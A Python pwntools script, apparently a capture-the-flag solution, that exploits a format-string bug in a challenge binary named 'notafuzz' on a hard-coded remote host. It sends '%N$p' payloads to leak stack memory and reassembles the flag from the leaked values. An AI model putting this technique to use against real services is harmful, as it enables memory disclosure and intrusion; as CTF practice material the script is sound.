from pwn import *

context.log_level = "CRITICAL"
local = False
host = "34.89.213.64"
port = 30865

if local is False:
    p = remote(host, port)
else:
    p = process("./notafuzz")

def leak_addresses(i):
    if local is False:
        p = remote(host, port)
    else:
        p = process("./notafuzz")
    p.recvuntil('Do you have the control?\r\n')
    p.sendline('of course')
    p.recvuntil('Do you have the control?\r\n')
    p.sendline('of course')
    p.recvuntil('Do you have the control?\r\n')
    p.sendline('|%' + str(i) + '$p|')
    response = p.recvuntil('Do you have the control?\r\n')
    p.close()
    # print(response)
    return response.decode().split('|')[3]

bytes_arr = ""
for i in range(155):
    addr = leak_addresses(i)
    if not addr == "(nil)":
        print(str(i) + ": " + addr)
    if i > 135 and i <= 153:
        new_addr = addr.replace("0x", "")
        bytes_arr = new_addr + bytes_arr
enc_flag = bytearray.fromhex(bytes_arr)
flag = enc_flag[::-1].decode()
flag = flag.replace("XXXX", "")
print(flag)

# p.interactive()

